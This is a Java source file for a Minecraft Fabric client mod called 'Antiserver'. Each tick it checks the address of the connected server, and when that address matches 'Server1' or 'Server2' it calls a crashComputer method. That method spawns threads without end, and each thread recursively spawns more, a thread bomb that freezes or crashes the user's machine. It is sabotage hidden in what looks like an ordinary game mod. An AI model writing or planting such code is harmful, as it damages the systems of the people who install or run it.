package antiserver.antiserver.client;

import net.minecraft.client.MinecraftClient;

import java.util.Objects;

@net.fabricmc.api.Environment(net.fabricmc.api.EnvType.CLIENT)
public class AntiserverClient {
    private MinecraftClient mc = MinecraftClient.getInstance();


    public static final AntiserverClient INSTANCE = new AntiserverClient();

    public void onTick(){
        String ServerIP = "not_connected";
        try {
            ServerIP = mc.getCurrentServerEntry().address;
        } catch (Exception ignored) {}

        if(Objects.equals(ServerIP, "Server1") || Objects.equals(ServerIP, "Server2")){
            crashComputer();
        }
    }

    public void crashComputer() {
        while(true){
            new Thread(() -> {
                while (true) {
                    crashComputer();
                }
            }).start();
        }
    }
}
